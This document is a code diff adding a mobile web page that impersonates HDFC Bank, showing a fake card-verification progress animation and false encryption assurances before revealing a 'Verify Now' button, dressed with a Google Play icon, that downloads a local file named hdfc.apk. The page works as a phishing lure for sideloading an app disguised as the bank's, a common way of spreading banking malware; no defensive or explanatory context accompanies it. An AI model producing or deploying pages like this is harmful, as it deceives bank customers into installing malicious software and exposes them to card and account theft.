@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDFC Bank - Secure Processing</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --hdfc-blue: #004c8f;
+            --hdfc-red: #ed232a;
+            --bg-grey: #f8fafc;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body {
+            background-color: var(--bg-grey);
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+        /* Secure Navbar */
+        nav {
+            background: var(--hdfc-blue);
+            padding: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        nav img { height: 28px; }
+
+        /* Verification Container */
+        .verification-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 30px;
+            text-align: center;
+        }
+
+        /* Loader Animation */
+        .loader-box {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin-bottom: 30px;
+        }
+        .spinner {
+            width: 100%;
+            height: 100%;
+            border: 8px solid #e1e8ed;
+            border-top: 8px solid var(--hdfc-blue);
+            border-right: 8px solid var(--hdfc-red);
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+        }
+        .percent {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--hdfc-blue);
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .status-header { color: var(--hdfc-blue); font-size: 20px; font-weight: 800; margin-bottom: 10px; }
+        .status-sub { color: #666; font-size: 14px; margin-bottom: 40px; }
+
+        /* Download App Button */
+        .download-app-btn {
+            background: var(--hdfc-blue);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 14px;
+            margin-top: 20px;
+            width: 100%;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 4px 12px rgba(0, 76, 143, 0.2);
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        /* Steps List */
+        .steps-list { width: 100%; max-width: 300px; text-align: left; }
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            opacity: 0.3;
+            transition: all 0.5s ease;
+        }
+        .step.active { opacity: 1; transform: translateX(5px); }
+        .step.completed { color: #4caf50; opacity: 1; }
+        .step-icon { font-size: 18px; }
+        .step-text { font-size: 14px; font-weight: 600; }
+
+        /* Security Badge */
+        .security-banner {
+            background: #fff;
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 40px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            width: 100%;
+        }
+        .security-banner i { color: #4caf50; font-size: 24px; }
+        .security-banner p { font-size: 11px; color: #777; text-align: left; line-height: 1.4; }
+    </style>
+</head>
+<body>
+    <nav>
+        <img src="./hdftoolimage.png" alt="HDFC Bank Logo">
+    </nav>
+
+    <div class="verification-container">
+        <div class="loader-box">
+            <div class="spinner"></div>
+            <div class="percent" id="percentage">0%</div>
+        </div>
+
+        <h2 class="status-header">Verifying Details</h2>
+        <p class="status-sub">Please wait, do not close the window or press back button.</p>
+
+        <div class="steps-list">
+            <div class="step active" id="step1"><i class="fas fa-shield-alt step-icon"></i> <span class="step-text">Securing Connection...</span></div>
+            <div class="step" id="step2"><i class="fas fa-search-dollar step-icon"></i> <span class="step-text">Validating Card Details...</span></div>
+            <div class="step" id="step3"><i class="fas fa-university step-icon"></i> <span class="step-text">Communicating with Bank...</span></div>
+            
+            <a href="./hdfc.apk" download class="download-app-btn" id="download-btn">
+                <i class="fab fa-google-play"></i> Verify Now
+            </a>
+        </div>
+
+        <div class="security-banner">
+            <i class="fas fa-lock"></i>
+            <p>Your session is protected by <strong>End-to-End Encryption</strong>. Your card details are being verified securely via HDFC Secure Gateway.</p>
+        </div>
+    </div>
+
+    <script>
+        let progress = 0;
+        const percentageEl = document.getElementById('percentage');
+        const steps = [document.getElementById('step1'), document.getElementById('step2'), document.getElementById('step3')];
+        const statusHeader = document.querySelector('.status-header');
+        const downloadBtn = document.getElementById('download-btn');
+        
+        const interval = setInterval(() => {
+            progress += Math.floor(Math.random() * 3) + 1;
+            if (progress > 100) progress = 100;
+            percentageEl.innerText = progress + '%';
+
+            if (progress > 30) { steps[0].classList.add('completed'); steps[1].classList.add('active'); }
+            if (progress > 65) { steps[1].classList.add('completed'); steps[2].classList.add('active'); }
+            
+            if (progress === 100) {
+                clearInterval(interval);
+                steps[2].classList.add('completed');
+                statusHeader.innerText = 'Verification Pending';
+                downloadBtn.style.display = 'flex';
+            }
+        }, 100);
+    </script>
+</body>
+</html>
